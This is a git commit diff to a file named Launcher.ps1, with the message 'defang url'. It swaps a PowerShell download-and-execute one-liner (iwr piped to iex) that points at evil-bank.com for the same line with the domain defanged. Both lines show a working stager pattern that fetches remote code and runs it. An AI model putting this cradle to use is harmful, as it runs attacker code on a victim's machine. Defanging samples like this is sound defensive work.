75f882d83b71258a376e2060897af5313e6ceb22
MatthewGeneNavarro <85688959+MatthewGeneNavarro@users.noreply.github.com>
2025-05-26 20:26:41 -0500

    Update Launcher.ps1
    defang url

--- Launcher.ps1
+++ Launcher.ps1
@@ -1,1 +1,1 @@
-(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://evil-bank.com/download/powershell/')-UseBasicParsing|iex
+(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://evil-bank[.]com/download/powershell/')-UseBasicParsing|iex
